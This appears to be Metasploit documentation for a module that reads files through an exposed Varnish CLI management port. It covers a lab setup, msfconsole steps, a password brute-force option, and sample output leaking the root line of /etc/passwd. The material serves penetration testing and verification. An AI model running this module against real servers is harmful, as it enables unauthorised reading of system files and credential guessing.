## Vulnerable Application

  Ubuntu 14.04 can `apt-get install varnish`.  At the time of writing that installed varnish-3.0.5 revision 1a89b1f.
  Kali installed varnish-5.0.0 revision 99d036f
  
  Varnish installed and ran the cli on localhost.  First lets kill the service: `sudo service varnish stop`.  Now, there are two configurations we want to test:

  1. No Authentication: `varnishd -T 0.0.0.0:6082`
  2. Authentication (based on shared secret file): `varnishd -T 0.0.0.0:6082 -S <file>`.
    1. I made an easy test one `echo "secret" > ~/secret`

## Verification Steps

  Example steps in this format:

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/varnish/varnish_cli_file_read```
  4. Do: ```set password <password>```
  5. Do: ```run```
  6. Get the first line of a file

## Options

  **PASSWORD**

  String to use as the password.  May be bruteforced via `modules/auxiliary/scanner/varnish/varnish_cli_login`

  **FILE**

  File to attempt to read the first line of

## Scenarios

  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f and NO AUTHENTICATION

  ```
    resource (varnish_read.rc)> use auxiliary/scanner/varnish/varnish_cli_file_read
    resource (varnish_read.rc)> set password secret
    password => secret
    resource (varnish_read.rc)> set rhosts 192.168.2.85
    rhosts => 192.168.2.85
    resource (varnish_read.rc)> set verbose true
    verbose => true
    resource (varnish_read.rc)> run
    [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: No Authentication Required
    [+] 192.168.2.85:6082     - root:x:0:0:root:/root:/bin/bash
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```

  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f

  ```
    msf auxiliary(varnish_cli_file_read) > run
    
    [+] 192.168.2.85:6082     - root:x:0:0:root:/root:/bin/bash
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
